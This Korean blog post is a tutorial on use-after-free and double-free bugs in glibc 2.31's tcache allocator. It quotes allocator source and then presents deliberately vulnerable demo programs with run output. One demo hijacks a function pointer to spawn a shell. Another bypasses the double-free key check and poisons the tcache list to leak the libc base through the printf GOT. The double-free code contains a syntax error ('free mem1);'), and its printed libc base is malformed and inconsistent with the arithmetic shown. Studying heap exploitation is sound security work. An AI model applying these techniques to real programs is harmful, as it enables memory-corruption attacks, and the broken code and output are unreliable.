---
layout: post
title: "Perthread cache (tcache)에서의 UAF와 DFB"
summary: "힙 오버플로우 취약점 연구"
author: david232818
date: '2023-09-07 10:40:23 +0900'
category: ['learning']
# tags: 
thumbnail: /assets/img/posts/default.png
keywords: heap, overflow
usemathjax: false
permalink: /blog/Heap_overflow/
---


Contents
--------
1. Introduction
2. free and malloc of perthread cache (tcache)
   1. free 함수
   2. malloc 함수
3. UAF (Use After Free)
4. DFB (Double Free Bug)
5. References



# Introduction
 본 문서에서는 힙 (heap)과 관련된 취약점 (vulnerability)인 UAF (Use After Free), DFB (Double Free Bug)를 perthread cache (tcache)상에서 살펴본다.

# free and malloc of perthread cache (tcache)
 본 문서에서 다루는 UAF, DFB가 왜 가능한지 이해하기 위해서는 malloc 함수의 할당전략에 대해 알 필요가 있다. 다만, 여기서는 Glibc 2.31 버전의 malloc 함수를 다룰 것이기 때문에 Glibc 버전에 따라 본 글에서 다루는 내용과 차이가 있을 수 있다.

 [1]은 Malloc Algorithm과 Free Algorithm을 각각 다음과 같이 설명한다.
 
```
1. Tcache에 적절한 (또는 정확한 크기의) 청크가 있다면, 이것이 호출자에게 리턴된다. 이때, 더 큰 크기의 bin으로부터 가용한 청크를 사용하려고 하지 않는다.

2. 요청이 충분히 크다면, mmap()이 호출되어 운영체제에게 직접적인 메모리 요청을 하게된다. 이때 mmap'ing의 임계값은 M_MMAP_THRESHOLD가 변경 (mallopt 함수 문서 참고) 되지 않는 한, 동적이고, 한 번에 매핑가능한 메모리의 크기에 제한이 있을 수 있다.

3. 만약 적절한 fastbin이 청크를 가지고 있다면, 이를 사용한다. 만약 추가적인 청크가 가용하다면 먼저 tcache를 채운다.

4. 만약 적절한 smallbin이 청크를 가지고 있다면, 이를 사용하고, 또한 먼저 tcache를 채운다.

5. 만약 요청된 크기가 "크다면", fastbins에 존재하는 모든 것을 unsorted bin으로 옮기면서 병합한다.

6. Unsorted list에서 병합하면서 청크를 꺼내서 small/large bins에 넣는다. 적절한 크기의 청크가 발견되면 이를 사용한다.

7. 만약 요청된 크기가 "크다면", 적절한 large bin을 찾고, 점점 큰 bins를 찾아나가며, 충분히 큰 청크가 발견될 때까지 찾는다.

8. 아직 fastbins가 여전히 청크를 갖는다면 (이는 "작은" 요청에서도 발생할 수 있다), 병합하고 이전 두 단계를 반복한다.

9. "top" 청크의 부분을 나누고, 이는 "top"을 미리 확장할 수도 있다.
```

```
1. Tcache에 넣을 곳이 있다면, 청크를 저장하고 리턴한다.

2. 청크가 충분히 작다면, 적절한 fastbin에 저장한다.

3. 만약 청크가 mmap되었다면, munmap한다.

4. 청크가 또다른 청크와 인접한지 확인하고 인접하다면, 병합한다.

5. 해제된 청크가 이제 "top" 청크가 되지 않는 한, unsorted list에 위치시킨다.

6. 만약 청크가 충분히 크다면, 어떤 fastbins와든 병합하고 top 청크가 시스템에 메모리를 줄 수 있을정도로 충분히 큰지 확인한다. 이는 성능 문제로 인해 수행되지 않을 수 있고 malloc 또는 다른 호출에서 수행될 수 있다.
```

 상기에 서술한 알고리즘은 Glibc 2.31 버전에 tcache (perthread cache)가 도입되어 있고, 일정 크기의 메모리 할당/해제에 대해서는 가장 높은 우선순위를 가짐을 보인다. 그래서 tcache에서의 메모리 할당과 해제를 다룰 것이다.
 
## free 함수
 먼저 메모리의 해제를 살펴보자. [2]는 free 함수를 다음과 같이 기술한다.
 
```C
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* See if the dynamic brk/mmap threshold needs adjusting.
	 Dumped fake mmapped chunks do not affect the threshold.  */
      if (!mp_.no_dyn_threshold
          && chunksize_nomask (p) > mp_.mmap_threshold
          && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX
	  && !DUMPED_MAIN_ARENA_CHUNK (p))
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);
      return;
    }

  MAYBE_INIT_TCACHE ();

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);
}
libc_hidden_def (__libc_free)
```

위 코드에서 hook과 mmaped if 블록은 관심대상이 아니다. 이들을 제외한다면, free 함수의 동작은 전달된 메모리 주소가 NULL인지 아닌지 확인하고 메모리를 청크로 변환한 다음 메모리 해제를 수행하는 것이 된다. 이때 [2]는 mem2chunk를 매크로 함수로 다음과 같이 정의한다. 즉, (사용자 프로그램에 리턴된 주소가 아닌) 실제 청크의 주소를 구하는 것이다.

```C
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
```

그리고 tcache가 아직 초기화되지 않은 경우에는 tcache_init()을 쓰기 위해 MAYBE_INIT_TCACHE 매크로를 사용하는데 [2]는 이를 다음과 같이 정의한다.

```C
# define MAYBE_INIT_TCACHE() \
  if (__glibc_unlikely (tcache == NULL)) \
    tcache_init();
```

그리고 청크의 arena를 얻는 작업을 진행하는데 이는 [3]이 정의하는 arena_for_chunk 매크로가 수행한다. 그러나 이미 초기 메모리 할당이 tcache로 이루어졌기 때문에 arena에서 수행될 작업은 없고 tcache의 영역에서 메모리 해제 작업을 수행하게 된다. 이는 _int_free 함수의 역할이고, [2]는 이 함수를 다음과 같이 정의한다 (tcache 부분까지 발췌).

```C
/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)

...

static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  size = chunksize (p);

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```
위 코드에 따라 해제된 메모리는 tcache에 저장된다 (#if 블록). 여기서 우리는 tcache와 tcache에서의 메모리 해제가 어떻게 동작하는지 확인할 필요가 있다.  [2]가 다음과 같이 정의하는 tcache는 일반적인 청크와 달리 tcache_perthread_struct라는 구조체로 정의된다. 그리고 tcache에 존재하는 bins의 entry는 tcache_entry라는 구조체로 정의된다. 그래서 tcache에서의 메모리 할당/해제를 처리하는 경우에는 chunk2mem 매크로가 사용된다.
 
```C
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

```C
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

```C
#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
```

위의 tcache_entry 구조체를 통해서 tcache는 단일 연결 리스트 (single linked list)로 동작함을 알 수 있다. 그리고 [2]가 다음과 같이 정의하는 tcache_put()을 통해 LIFO (Last In First Out) 구조의 형태로 동작한다는 것을 알 수 있다. 여기서 tcache에서의 entry는 각 tcache bins의 head 노드가 된다.

```C
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

따라서 할당된 메모리가 해제되면 tcache entry는 다음과 같이 변경된다.

```
[기존의 entry] -> [ 메모리 ] -> [ 메모리 ] -> ... -> NULL
|
|
V
[ 해제된 메모리  (새로운 entry) ] -> [ 기존의 entry ] -> [ 메모리 ] -> ...
-> NULL
```

## malloc 함수
 이제 메모리 할당 과정을 살펴보자. 상기에 서술하였듯이 Malloc Algorithm은 tcache에 가장 높은 우선순위를 부여한다. [2]는 이러한 Malloc Algorithm을 다음과 같이 구현한다 (tcache 부분까지 발췌).
 
```C
/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)

...

/* pad request bytes into a usable size -- internal version */

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/* Check if REQ overflows when padded and aligned and if the resulting value
   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in
   case the value is less than MINSIZE on SZ or false if any of the previous
   check fail.  */
static inline bool
checked_request2size (size_t req, size_t *sz) __nonnull (1)
{
  if (__glibc_unlikely (req > PTRDIFF_MAX))
    return false;
  *sz = request2size (req);
  return true;
}

...

void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
```

위 코드에 따라 tcache_get()이 메모리를 할당하게 되고 이는 [2]가 다음과 같이 정의한다.

```C
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

위 코드에 따라 tcache_get()은 tc_idx로 참조되는 리스트의 entry (head 노드)를 리턴한다. 이때, tc_idx는 요청된 크기와 이미 정의된 매크로인 MINSIZE, MALLOC_ALIGNMENT에 의존한다.

# UAF (Use After Free)
 UAF 취약점은 이름에서도 유추할 수 있듯이 메모리를 free한 후에도 이를 사용할 수 있을 때 발생한다. 즉, 이 취약점이 발생하는 상황은 일정 크기의 메모리가 할당되고 해제된 후에 다시 같은 크기의 메모리가 할당되는 것이다. 그럼 앞서 설명한 malloc 함수와 free 함수의 동작을 할당/해제/재할당이라는 상황에 비추어 살펴보자.
 
 먼저 상기에 서술한 malloc 함수와 free 함수의 동작을 정리하면 여기서 관심을 가지는 상황에서는 tcache의 영역에서 메모리의 해제와 할당이 이루어지고 이 과정은 tcache의 tc_idx로 참조되는 LIFO 구조의 단일 연결 리스트상에서 수행된다. 여기서 tc_idx는 요청된 크기와 이미 정의된 값에 의존하므로 요청된 크기가 이미 해제된 메모리의 크기와 같거나 같은 범위 내에 있다면 해제된 메모리가 존재하는 리스트에서 할당/해제가 이루어지게 된다. 이로부터 메모리를 할당하고 해제한 후에 이와 같은 크기의 메모리 할당 요청을 한다면 동일한 메모리 주소가 리턴될 것이라는 결론을 내릴 수 있다.
 
 상기의 결론은 만약 메모리를 할당하고 해제한 후에 같은 크기로 재할당한 메모리로 어떤 작업을 수행한다고 할 때, 이전에 할당되었던 메모리의 데이터가 사라지지는 않음을 의미한다. 이는 할당/해제 과정에서 일정 범위의 데이터에는 어떠한 연산도 수행되지 않기 때문이다. 이는 다음 예시 코드가 설명한다.
 
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

struct foo {
       char buf[8];
       void (*func)(void);
};

/* vuln: 0x400646 */
void vuln(void)
{
	system("/bin/sh");
}

/* gcc -no-pie uaf.c -o uaf */
int main(int argc, char *argv[])
{
	struct foo *mem1, *mem2, *mem3;

	if (argc != 2) return -1;

	mem1 = malloc(sizeof(struct foo));
	mem2 = malloc(sizeof(struct foo));
	strcpy(mem1->buf, argv[1]);
	printf("mem1: %p\n", mem1);
	printf("mem2: %p\n", mem2);
	free(mem1);
	mem3 = malloc(sizeof(struct foo));
	printf("mem3: %p\n", mem3);
	printf("mem3->func: %p\n", mem3->func);
	mem3->func();
	return 0;
}
```

위 코드를 실행한 결과는 다음과 같다.

```bash
jky@DESKTOP-1D1MMF0:~/c_programming$ ./uaf $(printf "AAAAAAAA\x46\x06\x40\x00")
mem1: 0x8e1010
mem2: 0x8e1030
mem3: 0x8e1010
mem3->func: 0x400646
$ exit
jky@DESKTOP-1D1MMF0:~/c_programming$
```

위 실행 결과를 보면 mem1과 mem3의 주소가 같고, mem1에 저장되었던 데이터의 일부가 mem3에서 아직 남아있음을 알 수 있다. 다만, 위의 예시에서는 함수의 주소를 미리 알 수 있었지만 대부분의 경우에는 ASLR과 PIE의 도입으로 불가능하다. 따라서 메모리 읽기 프리미티브와 연계되어 사용되어야 할 것이다. 또는, 함수의 주소에 대한 예측이 필요할 것이다.

# DFB (Double Free Bug)
 DFB도 이름에서 유추할 수 있듯이 메모리를 두 번 free할 수 있을 때 발생하는 취약점이다.
 
 Perthread cache (tcache)의 메모리 해제 과정을 다시 살펴보면 tcache bin의 head 노드를 변경하는 방식으로 메모리를 free list에 추가하여 해제를 수행한다. 이때 같은 메모리를 두 번 연속으로 해제하게 되면 아무런 방어기제가 없다고 가정했을 때 다음과 같이 free list가 구성된다.
 
```
1. 메모리 할당 (주소: 0x23922a0)

2. 할당된 메모리 해제
   tcache_entry -> [ 0x23922a0 ] -> NULL

3. 같은 메모리 해제 (두 번 연속으로 해제)
   tcache_entry -> [ 0x23922a0 ] -> [ 0x23922a0 ] -> NULL
```

그리고 tcache의 메모리 할당 과정을 다시 생각해보면 tcache bin의 head 노드를 변경하여 할당하므로 같은 범위 내의 크기가 요청된다면 두 번 연속으로 해제된 메모리가 있는 리스트에서 같은 메모리를 두 번 할당하게 된다. 그러나 이는 [2]가 정의한 free 함수에서 __glibc_unlikely (e->key == tcache)를 조건문으로 가지는 if 블록에 의해 탐지될 수 있다. 그러나 반대로, 이 if 블록에 걸리지 않는다면 double free는 tcache상에서 탐지되지 못하므로 이 방법으로 우회할 수 있다. 다만, 이는 해제된 메모리에 대한 쓰기 프리미티브가 존재하는 상황에서 성립한다. 이때 tcache의 key 멤버변수는 next 멤버변수 다음에 위치하므로 next의 크기만큼 더한 위치의 메모리에 어떤 값이든 쓸 수 있다면 앞서 언급한 if 블록에 걸리지 않게 된다. 이는 다음과 같은 메모리 구성을 의미한다.

```
할당된 메모리:
+---------------+
|   data        |<--next
+---------------+
|   data        |<--key
+---------------+
|    ....       |
+---------------+

메모리 해제 시, double free 방어기제 적용:
+---------------+
|   next        |
+---------------+
|   key         |<-- tcache (전역변수)에 저장된 값
+---------------+
|    ....       |
+---------------+

메모리 해제 후, key 조작:
+---------------+
|   next        |
+---------------+
|   0x41...     |<-- tcache (전역변수)의 값과 달라지므로 if 블록 통과
+---------------+
|    ....       |
+---------------+
```

이렇게 double free가 가능한 상황에서 next 멤버변수를 조작하여 double free를 임의 메모리 읽기/쓰기 프리미티브로 만들 수 있다. 이는 다음과 같이 free list를 구성한다는 것을 의미한다.

```
[ 할당될 메모리 ] -> [ 0x4141414141... ] -> ...
                ^
                |
                +---조작된 next 멤버변수
```

이를 다음과 같은 예시 코드로 살펴보자.

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

/* gcc -no-pie dfb.c -o dfb */
int main()
{
    unsigned char *mem1, *mem2, *mem3;
    unsigned char *libc_base_addr;

    mem1 = malloc(4);
    printf("mem1: %p\n", mem1);
    free mem1);
    *(mem1 + 8) = 0xef;
    free (mem1);
    *((uint64_t *) mem1) = 0x0000000000404020; /* address of printf (GOT) */
    mem2 = malloc(4);
    printf("mem2: %p\n", mem2);
    printf("mem2->next: %016lx\n", *((uint64_t *) mem2));
    mem3 = malloc(4);
    printf("mem3: %p\n", mem3);
    
    /* At this point, mem3 content is the absolute address of printf */
    printf("mem3 content: %016lx\n", *((uint64_t *) mem3));

    /* 0x61cc0 is a index of printf in libc.so.6 */
    libc_base_addr = *((uint64_t *) mem3) - 0x61cc0;
    printf("libc base address: %016lx\n", libc_base_addr);

    /* 0x1b45bd is a index of /bin/sh string in libc.so.6 */
    printf("/bin/sh: %p %s\n", libc_base_addr + 0x1b45bd,
    		     	       libc_base_addr + 0x1b45bd);
    return 0;
}
```

위 코드를 실행하면 다음과 같은 결과를 얻는다.

```
mem1: 0x7f82a0
mem2: 0x7f82a0
mem2->next: 0000000000404020
mem3: 0x404020
mem3 content: 00007fb4d4001cc0
libc base address: 00007fb4d4d3fa000
/bin/sh: 0x7fb4d41545bd /bin/sh
```

 정리하면 해제된 메모리에 대한 쓰기 프리미티브가 존재하는 상황에서는 tcache상에서 할당된 메모리를 해제했을 때의 key 멤버변수를 조작하여 double free 방어기법을 우회할 수 있다. 그리고 이러한 상황에서 next 멤버변수를 조작하여 임의 메모리 읽기 (상기 예시 코드에서는 printf()의 GOT)가 가능하고 또한 쓰기도 가능함을 유추할 수 있다.

# References
[1] Carlos Donell et al., "MallocInternals", glibc wiki, 2022. [Online]. Available: https://sourceware.org/glibc/wiki/MallocInternals, [Accessed Jul. 01, 2022]

[2] "malloc.c", GNU, 2020. [Online]. Available: http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz, [Accessed Jul. 02, 2022]

[3] "arena.c", GNU, 2020. [Online]. Available: http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz, [Accessed Jul. 02, 2022]